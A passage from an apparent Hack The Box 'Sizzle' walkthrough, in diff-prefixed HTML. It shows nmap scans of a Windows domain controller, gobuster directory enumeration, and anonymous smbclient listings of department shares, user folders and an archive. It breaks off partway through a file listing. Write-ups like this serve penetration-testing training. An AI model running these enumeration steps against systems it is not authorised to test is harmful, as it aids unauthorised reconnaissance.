+</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>HTB-SIZZLE-CA
+</span></span><span style="display:flex;"><span>| Public Key type: rsa
+</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
+</span></span><span style="display:flex;"><span>| Not valid before: 2021-02-11T12:59:51
+</span></span><span style="display:flex;"><span>| Not valid after:  2022-02-11T12:59:51
+</span></span><span style="display:flex;"><span>| MD5:   6346:07e3:ae83:0744:681e:3c0b:00ff:80d9
+</span></span><span style="display:flex;"><span>|_SHA-1: e071:44af:92c6:e202:8f21:0fc6:c9c7:433b:360b:e3a9
+</span></span><span style="display:flex;"><span>443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>sizzle.htb.local
+</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>HTB-SIZZLE-CA
+</span></span><span style="display:flex;"><span>| Public Key type: rsa
+</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
+</span></span><span style="display:flex;"><span>| Not valid before: 2018-07-03T17:58:55
+</span></span><span style="display:flex;"><span>| Not valid after:  2020-07-02T17:58:55
+</span></span><span style="display:flex;"><span>| MD5:   240b:1eff:5a65:ad8d:c64d:855e:aeb5:9e6b
+</span></span><span style="display:flex;"><span>|_SHA-1: 77bb:3f67:1b6b:3e09:b8f9:6503:ddc1:0bbf:0b75:0c72
+</span></span><span style="display:flex;"><span>| tls-alpn: 
+</span></span><span style="display:flex;"><span>|   h2
+</span></span><span style="display:flex;"><span>|_  http/1.1
+</span></span><span style="display:flex;"><span>|_ssl-date: 2025-02-26T03:37:42+00:00; +1m53s from scanner time.
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|   Supported Methods: OPTIONS TRACE GET HEAD POST
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#ae81ff">\&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: HTB.LOCAL, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2025-02-26T03:37:42+00:00; +1m53s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>sizzle.HTB.LOCAL
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL
+</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>HTB-SIZZLE-CA
+</span></span><span style="display:flex;"><span>| Public Key type: rsa
+</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
+</span></span><span style="display:flex;"><span>| Not valid before: 2021-02-11T12:59:51
+</span></span><span style="display:flex;"><span>| Not valid after:  2022-02-11T12:59:51
+</span></span><span style="display:flex;"><span>| MD5:   6346:07e3:ae83:0744:681e:3c0b:00ff:80d9
+</span></span><span style="display:flex;"><span>|_SHA-1: e071:44af:92c6:e202:8f21:0fc6:c9c7:433b:360b:e3a9
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: HTB.LOCAL, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>sizzle.HTB.LOCAL
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL
+</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>HTB-SIZZLE-CA
+</span></span><span style="display:flex;"><span>| Public Key type: rsa
+</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
+</span></span><span style="display:flex;"><span>| Not valid before: 2021-02-11T12:59:51
+</span></span><span style="display:flex;"><span>| Not valid after:  2022-02-11T12:59:51
+</span></span><span style="display:flex;"><span>| MD5:   6346:07e3:ae83:0744:681e:3c0b:00ff:80d9
+</span></span><span style="display:flex;"><span>|_SHA-1: e071:44af:92c6:e202:8f21:0fc6:c9c7:433b:360b:e3a9
+</span></span><span style="display:flex;"><span>|_ssl-date: 2025-02-26T03:37:42+00:00; +1m53s from scanner time.
+</span></span><span style="display:flex;"><span>3269/tcp  open  ssl/ldap
+</span></span><span style="display:flex;"><span>|_ssl-date: 2025-02-26T03:37:42+00:00; +1m53s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>sizzle.HTB.LOCAL
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL
+</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>HTB-SIZZLE-CA
+</span></span><span style="display:flex;"><span>| Public Key type: rsa
+</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
+</span></span><span style="display:flex;"><span>| Not valid before: 2021-02-11T12:59:51
+</span></span><span style="display:flex;"><span>| Not valid after:  2022-02-11T12:59:51
+</span></span><span style="display:flex;"><span>| MD5:   6346:07e3:ae83:0744:681e:3c0b:00ff:80d9
+</span></span><span style="display:flex;"><span>|_SHA-1: e071:44af:92c6:e202:8f21:0fc6:c9c7:433b:360b:e3a9
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>sizzle.HTB.LOCAL
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL
+</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>HTB-SIZZLE-CA
+</span></span><span style="display:flex;"><span>| Public Key type: rsa
+</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
+</span></span><span style="display:flex;"><span>| Not valid before: 2021-02-11T12:59:51
+</span></span><span style="display:flex;"><span>| Not valid after:  2022-02-11T12:59:51
+</span></span><span style="display:flex;"><span>| MD5:   6346:07e3:ae83:0744:681e:3c0b:00ff:80d9
+</span></span><span style="display:flex;"><span>|_SHA-1: e071:44af:92c6:e202:8f21:0fc6:c9c7:433b:360b:e3a9
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>| tls-alpn: 
+</span></span><span style="display:flex;"><span>|   h2
+</span></span><span style="display:flex;"><span>|_  http/1.1
+</span></span><span style="display:flex;"><span>|_ssl-date: 2025-02-26T03:37:42+00:00; +1m53s from scanner time.
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span style="display:flex;"><span>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49665/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49666/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49669/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49671/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49688/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49692/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49695/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49707/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49711/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows 2012|2016|2008|<span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2012</span> R2 <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2016</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> or Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>85%<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h3 id="http---80tcp">HTTP - 80/tcp</h3>
+<p><img src="/images/sizzle1.png" alt="sizzle1"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sizzle<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ gobuster dir -u http://10.129.124.103/ -w /usr/share/wordlists/dirb/common.txt                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.6
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.129.124.103/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.6
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>/aspnet_client        <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 159<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.129.124.103/aspnet_client/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/certenroll           <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 156<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.129.124.103/certenroll/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/certsrv              <span style="color:#f92672">(</span>Status: 401<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1293<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/Images               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 152<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.129.124.103/Images/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/images               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 152<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.129.124.103/images/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 60<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">4614</span> / <span style="color:#ae81ff">4615</span> <span style="color:#f92672">(</span>99.98%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Finished
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span></code></pre></div><p>Interesting endpoint, but we&rsquo;ll have to revisit this once we have credentials.</p>
+<p><img src="/images/sizzle3.png" alt="sizzle3"></p>
+<h3 id="smb---443tcp">SMB - 443/tcp</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sizzle<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbclient -L <span style="color:#ae81ff">\\\\</span>10.129.124.103<span style="color:#ae81ff">\\</span>              
+</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\p</span>l4stic<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Sharename       Type      Comment
+</span></span><span style="display:flex;"><span>        ---------       ----      -------
+</span></span><span style="display:flex;"><span>        ADMIN$          Disk      Remote Admin
+</span></span><span style="display:flex;"><span>        C$              Disk      Default share
+</span></span><span style="display:flex;"><span>        CertEnroll      Disk      Active Directory Certificate Services share
+</span></span><span style="display:flex;"><span>        Department Shares Disk      
+</span></span><span style="display:flex;"><span>        IPC$            IPC       Remote IPC
+</span></span><span style="display:flex;"><span>        NETLOGON        Disk      Logon server share 
+</span></span><span style="display:flex;"><span>        Operations      Disk      
+</span></span><span style="display:flex;"><span>        SYSVOL          Disk      Logon server share
+</span></span></code></pre></div><p>Interesting directory listing in the <code>Department Shares</code> SMB share.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sizzle<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbclient <span style="color:#ae81ff">\\\\</span>10.129.124.103<span style="color:#ae81ff">\\</span>Department<span style="color:#ae81ff">\ </span>Shares
+</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\p</span>l4stic<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> dir
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Tue Jul  <span style="color:#ae81ff">3</span> 11:22:32 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Tue Jul  <span style="color:#ae81ff">3</span> 11:22:32 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Accounting                          D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:21:43 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Audit                               D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:14:28 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Banking                             D        <span style="color:#ae81ff">0</span>  Tue Jul  <span style="color:#ae81ff">3</span> 11:22:39 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  CEO_protected                       D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:15:01 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Devops                              D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:19:33 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Finance                             D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:11:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  HR                                  D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:16:11 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Infosec                             D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:14:24 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Infrastructure                      D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:13:59 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  IT                                  D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:12:04 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Legal                               D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:12:09 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  M&amp;A                                 D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:15:25 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Marketing                           D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:14:43 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  R&amp;D                                 D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:11:47 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Sales                               D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:14:37 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Security                            D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:21:47 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Tax                                 D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:16:54 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Users                               D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">10</span> 17:39:32 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ZZ_ARCHIVE                          D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:58 <span style="color:#ae81ff">2018</span>
+</span></span></code></pre></div><p>And we even found some possible usernames in the <code>Users</code> folder&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">10</span> 17:39:32 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">10</span> 17:39:32 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  amanda                              D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:18:43 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  amanda_adm                          D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:19:06 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  bill                                D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:18:28 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  bob                                 D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:18:31 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  chris                               D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:19:14 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  henry                               D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:18:39 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  joe                                 D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:18:34 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  jose                                D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:18:53 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  lkys37en                            D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">10</span> 17:39:04 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  morgan                              D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:18:48 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  mrb3n                               D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:19:20 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Public                              D        <span style="color:#ae81ff">0</span>  Wed Sep <span style="color:#ae81ff">26</span> 01:45:32 <span style="color:#ae81ff">2018</span>
+</span></span></code></pre></div><p>And some interesting files in the <code>ZZ_ARCHIVE</code> folder, all the same size and no real contents of use&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\Z</span>Z_ARCHIVE<span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:58 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:58 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  AddComplete.pptx                    A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:58 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  AddMerge.ram                        A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ConfirmUnprotect.doc                A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ConvertFromInvoke.mov               A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ConvertJoin.docx                    A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  CopyPublish.ogg                     A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  DebugMove.mpg                       A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  DebugSelect.mpg                     A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:58 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  DebugUse.pptx                       A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  DisconnectApprove.ogg               A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:58 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  DisconnectDebug.mpeg2               A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  EditCompress.xls                    A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  EditMount.doc                       A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:58 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  EditSuspend.mp3                     A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:58 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  EnableAdd.pptx                      A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  EnablePing.mov                      A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:58 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  EnableSend.ppt                      A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:58 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  EnterMerge.mpeg                     A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ExitEnter.mpg                       A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:58 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ExportEdit.ogg                      A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  GetOptimize.pdf                     A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:58 <span style="color:#ae81ff">2018</span>
